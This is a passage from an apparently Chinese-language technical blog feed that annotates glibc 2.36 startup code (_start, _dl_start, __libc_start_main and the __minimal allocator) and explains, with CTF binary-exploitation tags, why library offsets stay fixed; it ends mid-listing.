(__environ); <span class="hljs-comment">// 初始化tunable_list列表</span><br><br>  ARCH_INIT_CPU_FEATURES ();<br><br>  _dl_relocate_static_pie ();<span class="hljs-comment">//重定位程序的rel段</span><br><br>  ARCH_SETUP_IREL ();<br><br>  ARCH_SETUP_TLS (); <span class="hljs-comment">// 初始化栈保护相关信息</span><br><br>  ARCH_APPLY_IREL ();<br><br>  <span class="hljs-type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> THREAD_SET_STACK_GUARD</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  __stack_chk_guard = stack_chk_guard;<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span> <span class="hljs-comment">//设置栈保护canary，主要是从将dl_random中读出来的数据的第一个字节设置为0</span></span><br><br>  <span class="hljs-keyword">if</span> (__pthread_initialize_minimal != <span class="hljs-literal">NULL</span>)<br>    __pthread_initialize_minimal ();<br><br>  <span class="hljs-type">uintptr_t</span> pointer_chk_guard = _dl_setup_pointer_guard (_dl_random,<br> stack_chk_guard); <span class="hljs-comment">//设置指针保护值</span><br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> THREAD_SET_POINTER_GUARD</span><br>  THREAD_SET_POINTER_GUARD (pointer_chk_guard);<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  __pointer_chk_guard_local = pointer_chk_guard;<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (__glibc_likely (rtld_fini != <span class="hljs-literal">NULL</span>))<br>    __cxa_atexit ((<span class="hljs-type">void</span> (*) (<span class="hljs-type">void</span> *)) rtld_fini, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SHARED</span><br>  __libc_early_init (<span class="hljs-literal">true</span>);<br><br>  __libc_init_first (argc, argv, __environ);<br><br>  __cxa_atexit (call_fini, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (__libc_enable_secure, <span class="hljs-number">0</span>))<br>    __libc_check_standard_fds ();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* !SHARED */</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="hljs-number">0</span>))<br>    GLRO(dl_debug_printf) (<span class="hljs-string">&quot;\ninitialize program: %s\n\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-keyword">if</span> (init != <span class="hljs-literal">NULL</span>)<br>    (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);<br>  <span class="hljs-keyword">else</span><br>    call_init (argc, argv, __environ);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">与_dl_init中的操作类似，都是执行一些初始化函数</span><br><span class="hljs-comment">*/</span><br>  _dl_audit_preinit (GL(dl_ns)[LM_ID_BASE]._ns_loaded);<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))<br>    GLRO(dl_debug_printf) (<span class="hljs-string">&quot;\ntransferring control: %s\n\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span> <span class="hljs-comment">/* !SHARED */</span></span><br>  call_init (argc, argv, __environ);<br><br>  _dl_debug_initialize (<span class="hljs-number">0</span>, LM_ID_BASE);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  __libc_start_call_main (main, argc, argv MAIN_AUXVEC_PARAM);<br>  <span class="hljs-comment">/* 执行程序*/</span><br>&#125;<br><br><span class="hljs-keyword">_Noreturn</span> <span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br>__libc_start_call_main (<span class="hljs-type">int</span> (*main) (<span class="hljs-type">int</span>, <span class="hljs-type">char</span> **, <span class="hljs-type">char</span> ** MAIN_AUXVEC_DECL),<br>                        <span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv MAIN_AUXVEC_DECL)<br>&#123;<br>  <span class="hljs-built_in">exit</span> (main (argc, argv, __environ MAIN_AUXVEC_PARAM));<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="libc-start-main概要">__libc_start_main概要</h4><p>在<code>_libc_start_main</code>中执行的有些操作其实在<code>_dl_main</code>中已经执行过了</p><p>这里再次执行应该是为了确保程序执行环境完整</p><p>那么现在还剩下一个问题，那就是为什么程序启动之后<code>libc.so</code>与<code>ld.so</code>之间的偏移是不变的</p><p>这需要我们去查阅<code>__minimal_malloc</code>,<code>__minimal_free</code>,<code>__mini_calloc</code>,<code>__minimal_realloc</code>这四个函数的源码</p><h2 id="空间管理">空间管理</h2><h3 id="minimal源码">__minimal源码</h3><blockquote><p>因为执行时内存还不完善，所以__minimal支配空间的代码都比较简单</p></blockquote><h4 id="minimal-malloc">__minimal_malloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * __minimal_malloc (<span class="hljs-type">size_t</span> n)<br>&#123;<br>  <span class="hljs-keyword">if</span> (alloc_end == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> _end attribute_hidden;<br>      alloc_ptr = &amp;_end;<br>      alloc_end = (<span class="hljs-type">void</span> *) <span class="hljs-number">0</span> + (((alloc_ptr - (<span class="hljs-type">void</span> *) <span class="hljs-number">0</span>)<br> + GLRO(dl_pagesize) - <span class="hljs-number">1</span>)<br>&amp; ~(GLRO(dl_pagesize) - <span class="hljs-number">1</span>));<br>    &#125;<br><br>  alloc_ptr = (<span class="hljs-type">void</span> *) <span class="hljs-number">0</span> + (((alloc_ptr - (<span class="hljs-type">void</span> *) <span class="hljs-number">0</span>) + MALLOC_ALIGNMENT - <span class="hljs-number">1</span>)<br>    &amp; ~(MALLOC_ALIGNMENT - <span class="hljs-number">1</span>));<br>  <span class="hljs-comment">// 向上对齐分配的地址</span><br><br>  <span class="hljs-keyword">if</span> (alloc_ptr + n &gt;= alloc_end || n &gt;= -(<span class="hljs-type">uintptr_t</span>) alloc_ptr)<br>    &#123;  <span class="hljs-comment">// 剩余的空间不足以分配</span><br>      <span class="hljs-type">caddr_t</span> page;<br>      <span class="hljs-type">size_t</span> nup = (n + GLRO(dl_pagesize) - <span class="hljs-number">1</span>) &amp; ~(GLRO(dl_pagesize) - <span class="hljs-number">1</span>);  <span class="hljs-comment">// 分配需要的空间大小</span><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (nup == <span class="hljs-number">0</span> &amp;&amp; n != <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>      nup += GLRO(dl_pagesize);<br>      page = __mmap (<span class="hljs-number">0</span>, nup, PROT_READ|PROT_WRITE,<br>     MAP_ANON|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>      <span class="hljs-keyword">if</span> (page != alloc_end)<br>alloc_ptr = page;<br>      alloc_end = page + nup;<br>      <span class="hljs-comment">// 向内核申请一段空间</span><br>    &#125;<br><br>  alloc_last_block = (<span class="hljs-type">void</span> *) alloc_ptr;<br>  alloc_ptr += n;<br>  <span class="hljs-keyword">return</span> alloc_last_block;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="minimal-calloc">__minimal_calloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * __minimal_calloc (<span class="hljs-type">size_t</span> nmemb, <span class="hljs-type">size_t</span> size)<br>&#123;<br>  <span class="hljs-comment">/* New memory from the trivial malloc above is always already cleared.</span><br><span class="hljs-comment">     (We make sure that&#x27;s true in the rare occasion it might not be,</span><br><span class="hljs-comment">     by clearing memory in free, below.)  */</span><br>  <span class="hljs-type">size_t</span> bytes = nmemb * size;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HALF_SIZE_T (((size_t) 1) &lt;&lt; (8 * sizeof (size_t) / 2))</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((nmemb | size) &gt;= HALF_SIZE_T, <span class="hljs-number">0</span>)<br>      &amp;&amp; size != <span class="hljs-number">0</span> &amp;&amp; bytes / size != nmemb)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-keyword">return</span> __minimal_malloc (bytes);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="minimal-realloc">__minimal_realloc</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__minimal_realloc (<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> n)<br>&#123;<br>  <span class="hljs-keyword">if</span> (ptr == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> __minimal_malloc (n);<br>  assert (ptr == alloc_last_block);<br>  <span class="hljs-type">size_t</span> old_size = alloc_ptr - alloc_last_block;<br>  alloc_ptr = alloc_last_block;<br>  <span class="hljs-type">void</span> *new = __minimal_malloc (n);<br>  <span class="hljs-keyword">return</span> new != ptr ? <span class="hljs-built_in">memcpy</span> (new, ptr, old_size) : new;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="minimal-free">__minimal_free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __minimal_free (<span class="hljs-type">void</span> *ptr)<br>&#123;<br>  <span class="hljs-comment">/* We can free only the last block allocated.  */</span><br>  <span class="hljs-keyword">if</span> (ptr == alloc_last_block)<br>    &#123;<br>      <span class="hljs-comment">/* Since this is rare, we clear the freed block here</span><br><span class="hljs-comment"> so that calloc can presume malloc returns cleared memory.  */</span><br>      <span class="hljs-built_in">memset</span> (alloc_last_block, <span class="hljs-string">&#x27;\0&#x27;</span>, alloc_ptr - alloc_last_block);<br>      alloc_ptr = alloc_last_block;<br>    &#125;<br>    <span class="hljs-comment">// 当释放区域与剩余空间相连时，将两个空间合并</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="空间管理概要">空间管理概要</h3><p>在<code>__minimal</code>相关的分配函数中可以看到，实际的用于分配的空间只有一个</p><p>分配的所有空间都从这个空间分离出来</p><p>当需要的空间超出剩余空间时会申请一个大空间，然后继续分裂</p><p>现在<code>libc</code>与<code>ld</code>的空间偏移不变的原因找到了，那就是它们本身对于大空间的偏移是相同的</p><p>通过推理也可以得到<code>fs段</code>与<code>libc</code>的距离不变的原因</p>]]></content>
    
    
    <categories>
      
      <category>程序启动过程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>源码阅读</tag>
      
      <tag>二进制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>程序启动过程分析(一)--_start</title>
    <link href="/page/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90(%E4%B8%80)/"/>
    <url>/page/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<blockquote><p>心血来潮想要看看程序到底是怎么开始的，于是就有了这篇文章</p></blockquote><h2 id="流程图">流程图</h2><p><img src="/img/blog_img/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B.png" srcset="/img/loading.gif" lazyload alt="程序启动流程" title="程序启动流程"></p><h2 id="分析代码">分析代码</h2><p>起初,我以为加载依赖等操作是在<code>__libc_start_main</code>中执行的</p><p>想从程序入口开始执行，一步步探寻程序启动过程，于是使用gdb调试程序,并把断点下在了<code>_start</code>处.</p><p>我发现这个时候断点列表中有两个,一个指向了<code>ld.so::_start</code>,一个指向了<code>elf::_start</code>.</p><p>从这里我就知道了,要想知道实际上是怎么执行的,不能只看<code>__libc_start_main</code>函数的源码,得从<code>ld.so::_start</code>开始看</p><p>下面我以<code>glibc2.36</code>版本的源码进行分析</p><h3 id="start-dl-start-user">_start&amp;&amp;_dl_start_user</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// #define RTLD_START</span><br>.text<br>        .align <span class="hljs-number">16</span><br>.globl _start<br>.globl _dl_start_user<br>_start:<br>        movq %rsp, %rdi<br>        call _dl_start<br>_dl_start_user:<br>        # Save the user entry point address in %r12.<br>        movq %rax, %r12<br>        # Read the original argument count.<br>        movq (%rsp), %rdx<br>        # Call _dl_init (<span class="hljs-keyword">struct</span> link_map *main_map, <span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **env)<br>        <span class="hljs-meta"># argc -&gt; rsi</span><br>        movq %rdx, %rsi<br>        # Save %rsp value in %r13.<br>        movq %rsp, %r13<br>        # And align <span class="hljs-built_in">stack</span> <span class="hljs-keyword">for</span> the _dl_init call.<br>        andq $<span class="hljs-number">-16</span>, %rsp<br>        # _dl_loaded -&gt; rdi<br>        movq _rtld_local(%rip), %rdi<br>        <span class="hljs-meta"># env -&gt; rcx</span><br>        leaq <span class="hljs-number">16</span>(%r13,%rdx,<span class="hljs-number">8</span>), %rcx<br>        <span class="hljs-meta"># argv -&gt; rdx</span><br>        leaq <span class="hljs-number">8</span>(%r13), %rdx<br>        # Clear %rbp to mark outermost frame obviously even <span class="hljs-keyword">for</span> constructors.<br>        xorl %ebp, %ebp<br>        # Call the function to run the initializers.<br>        call _dl_init<br>        # Pass our finalizer function to the user in %rdx, as per ELF ABI.<br>        leaq _dl_fini(%rip), %rdx<br>        # And make sure %rsp points to argc stored on the <span class="hljs-built_in">stack</span>.<br>        movq %r13, %rsp<br>        # Jump to the user<span class="hljs-number">&#x27;</span>s entry point.<br>        jmp *%r12<br>.previous<br></code></pre></td></tr></table></figure><h4 id="start-dl-start-user概要">_start&amp;&amp;_dl_start_user概要</h4><p>这是一段由汇编构成的代码，其中存在两个符号<code>_start</code>,<code>_dl_start_user</code></p><p>从上面看出<code>_start</code>只做一件事情, 那就是调用<code>_dl_start</code>函数</p><p>而<code>_dl_start_user</code>则调用了<code>_dl_init</code>, 并跳转到程序入口处</p><h3 id="dl-start">_dl_start</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DONT_USE_BOOTSTRAP_MAP</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> bootstrap_map _dl_rtld_map</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> bootstrap_map info.l</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">static</span> Elf64_Addr __attribute_used__<br>_dl_start (<span class="hljs-type">void</span> *arg)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DONT_USE_BOOTSTRAP_MAP</span><br>  rtld_timer_start (&amp;start_time);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dl_start_final_info</span> <span class="hljs-title">info</span>;</span><br>  rtld_timer_start (&amp;info.start_time);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> DONT_USE_BOOTSTRAP_MAP</span><br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> HAVE_BUILTIN_MEMSET</span><br>  __builtin_memset (bootstrap_map.l_info, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span> (bootstrap_map.l_info));<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> cnt = <span class="hljs-number">0</span>;<br>       cnt &lt; <span class="hljs-keyword">sizeof</span> (bootstrap_map.l_info) / <span class="hljs-keyword">sizeof</span> (bootstrap_map.l_info[<span class="hljs-number">0</span>]);<br>       ++cnt)<br>    bootstrap_map.l_info[cnt] = <span class="hljs-number">0</span>;<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  bootstrap_map.l_addr = elf_machine_load_address (); <br><br>  bootstrap_map.l_ld = (<span class="hljs-type">void</span> *) bootstrap_map.l_addr + elf_machine_dynamic ();<br>  bootstrap_map.l_ld_readonly = DL_RO_DYN_SECTION;<br>  elf_get_dynamic_info (&amp;bootstrap_map, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>); <br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> NO_TLS_OFFSET != 0</span><br>  bootstrap_map.l_tls_offset = NO_TLS_OFFSET;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> ELF_MACHINE_BEFORE_RTLD_RELOC</span><br>  ELF_MACHINE_BEFORE_RTLD_RELOC (&amp;bootstrap_map, bootstrap_map.l_info);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> (bootstrap_map.l_addr)<br>    &#123;<br><br>      ELF_DYNAMIC_RELOCATE (&amp;bootstrap_map, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>  bootstrap_map.l_relocated = <span class="hljs-number">1</span>;<br>     <br>  __rtld_malloc_init_stubs ();<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  设置后面申请空间使用的分配器</span><br><span class="hljs-comment">  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DONT_USE_BOOTSTRAP_MAP</span><br>  <span class="hljs-keyword">return</span> _dl_start_final (arg);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-keyword">return</span> _dl_start_final (arg, &amp;info);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br><span class="hljs-type">void</span><br>__rtld_malloc_init_stubs (<span class="hljs-type">void</span>)<br>&#123;<br>  __rtld_calloc = &amp;__minimal_calloc;<br>  __rtld_free = &amp;__minimal_free;<br>  __rtld_malloc = &amp;__minimal_malloc;<br>  __rtld_realloc = &amp;__minimal_realloc;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="dl-start概要">_dl_start概要</h4><p>从代码中可以看出,<code>_dl_start</code>先设置了用于描述<code>ld.so</code>的<code>link_map</code>结构体的属性</p><p>然后调用了<code>__rtld_malloc_init_stubs</code>,这个函数用来设置管理内存空间的管理函数为<code>__minimal</code>相关的函数</p><p>最后会执行<code>_dl_start_final</code>函数</p><h3 id="dl-start-final">_dl_start_final</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DONT_USE_BOOTSTRAP_MAP</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> Elf64_Addr __attribute__ ((always_inline))<br>_dl_start_final (<span class="hljs-type">void</span> *arg)<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-type">static</span> Elf64_Addr __attribute__ ((noinline))<br>_dl_start_final (<span class="hljs-type">void</span> *arg, <span class="hljs-keyword">struct</span> dl_start_final_info *info)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#123;<br>  Elf64_Addr start_addr;<br><br>  GLRO (dl_find_object) = &amp;_dl_find_object;<br><br>  rtld_timer_start (&amp;start_time);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> !defined DONT_USE_BOOTSTRAP_MAP</span><br>  RTLD_TIMING_SET (start_time, info-&gt;start_time);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> DONT_USE_BOOTSTRAP_MAP</span><br>  GL(dl_rtld_map).l_addr = info-&gt;l.l_addr;<br>  GL(dl_rtld_map).l_ld = info-&gt;l.l_ld;<br>  GL(dl_rtld_map).l_ld_readonly = info-&gt;l.l_ld_readonly;<br>  <span class="hljs-built_in">memcpy</span> (GL(dl_rtld_map).l_info, info-&gt;l.l_info,<br>  <span class="hljs-keyword">sizeof</span> GL(dl_rtld_map).l_info);<br>  GL(dl_rtld_map).l_mach = info-&gt;l.l_mach;<br>  GL(dl_rtld_map).l_relocated = <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _dl_setup_hash (&amp;GL(dl_rtld_map));<br>  GL(dl_rtld_map).l_real = &amp;_dl_rtld_map;<br>  GL(dl_rtld_map).l_map_start = (ElfW(Addr)) &amp;__ehdr_start;<br>  GL(dl_rtld_map).l_map_end = (ElfW(Addr)) _end;<br>  GL(dl_rtld_map).l_text_end = (ElfW(Addr)) _etext;<br>  <span class="hljs-comment">/* Copy the TLS related data if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> DONT_USE_BOOTSTRAP_MAP</span><br><span class="hljs-meta"># <span class="hljs-keyword">if</span> NO_TLS_OFFSET != 0</span><br>  GL(dl_rtld_map).l_tls_offset = NO_TLS_OFFSET;<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  __libc_stack_end = __builtin_frame_address (<span class="hljs-number">0</span>);<br><br>  start_addr = _dl_sysdep_start (arg, &amp;dl_main);<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))<br>    &#123;<br>      RTLD_TIMING_VAR (rtld_total_time);<br>      rtld_timer_stop (&amp;rtld_total_time, start_time);<br>      print_statistics (RTLD_TIMING_REF(rtld_total_time));<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> ELF_MACHINE_START_ADDRESS</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> ELF_MACHINE_START_ADDRESS(map, start) (start)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">return</span> ELF_MACHINE_START_ADDRESS (GL(dl_ns)[LM_ID_BASE]._ns_loaded, start_addr);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="dl-start-final概要">_dl_start_final概要</h4><p>从这里可以看出,先进行了一些与<code>_dl_start</code>重复的操作</p><p>然后执行了<code>_dl_sysdep_start(arg,&amp;dl_main)</code></p><p>需要记住的是传入的<code>arg</code>参数,指向的位置就是栈空间中储存参数的开头</p><h3 id="dl-sysdep-start">_dl_sysdep_start</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 